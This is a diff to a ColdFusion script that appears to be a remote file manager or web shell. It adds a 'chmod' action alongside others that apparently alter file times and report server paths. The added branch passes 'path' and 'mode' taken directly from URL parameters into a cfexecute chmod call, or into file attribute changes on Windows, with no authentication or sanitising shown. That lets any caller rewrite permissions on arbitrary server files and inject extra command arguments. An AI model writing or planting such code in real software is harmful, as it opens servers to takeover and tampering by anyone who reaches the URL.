@@ -191,6 +191,33 @@
             <cfset result = serializeJSON({"success": false, "message": "Not found or invalid time"})>
         </cfif>
 
+    <cfelseif action EQ "chmod">
+        <cfparam name="url.mode" default="">
+        <cfset path = url.path>
+        <cfset mode = url.mode>
+        <cfif (fileExists(path) OR directoryExists(path)) AND mode NEQ "">
+            <cftry>
+                <cfif server.os.name CONTAINS "Windows">
+                    <!--- Windows: set readonly attribute --->
+                    <cfif mode EQ "readonly">
+                        <cffile action="setattribute" file="#path#" attribute="readonly">
+                    <cfelse>
+                        <cffile action="setattribute" file="#path#" attribute="normal">
+                    </cfif>
+                    <cfset result = serializeJSON({"success": true, "message": "Attribute changed"})>
+                <cfelse>
+                    <!--- Unix: use chmod command --->
+                    <cfexecute name="chmod" arguments="#mode# #path#" timeout="10" />
+                    <cfset result = serializeJSON({"success": true, "message": "Permission changed"})>
+                </cfif>
+            <cfcatch>
+                <cfset result = serializeJSON({"success": false, "message": "Failed: " & cfcatch.message})>
+            </cfcatch>
+            </cftry>
+        <cfelse>
+            <cfset result = serializeJSON({"success": false, "message": "Not found or mode empty"})>
+        </cfif>
+
     <cfelseif action EQ "server">
         <cfset docRoot = expandPath("/")>
         <cfset result = serializeJSON({
